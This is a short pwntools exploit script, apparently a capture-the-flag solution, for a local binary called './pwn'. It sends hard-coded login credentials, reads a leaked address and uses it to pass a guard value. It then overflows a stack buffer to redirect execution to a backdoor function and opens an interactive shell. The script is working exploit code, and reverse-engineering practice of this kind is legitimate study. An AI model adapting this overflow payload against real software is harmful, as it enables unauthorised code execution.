from pwn import *
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-l 100']
context.log_level = 'debug'
io = process('./pwn')
libc = ELF('./libc.so.6')
elf = ELF('./pwn')
pr = lambda x:success('\x1b[01;38;5;214m'+hex(x)+'\x1b[0m')
sl = lambda x:io.sendline(x)
s  = lambda x:io.send(x) 
rt = lambda x:io.recvuntil(x)
ri = lambda x:int(io.recv(x),16)
ru = lambda x:u64(io.recv(x).ljust(8,b'\x00'))
it = lambda  :io.interactive()
sp = lambda  :sleep(1.5)
q  = lambda  :sleep(0.2)

OFF = 0x58
BACKDOOR = 0x401236
RET = 0x0000000000401016 
USER = "admin"
PASSWORD = "123456"
INFO1 = "input your name:"
INFO2 = "input your pasword:"
LIMIT = ''

def auth():
    rt(INFO1)
    s(USER)
    rt(INFO2)
    s(PASSWORD)

def build():
    pd = b'a'*(OFF-0x10)
    pd += flat(LIMIT,0)
    pd += flat(RET,BACKDOOR)
    return pd

def leak():
    global LIMIT
    rt("chunk_addr: ")
    LIMIT = ri(16)
    pr(LIMIT)

gdb.attach(io,"b *0x4012BD")
auth()
leak()
pay = build()
s(pay)
it()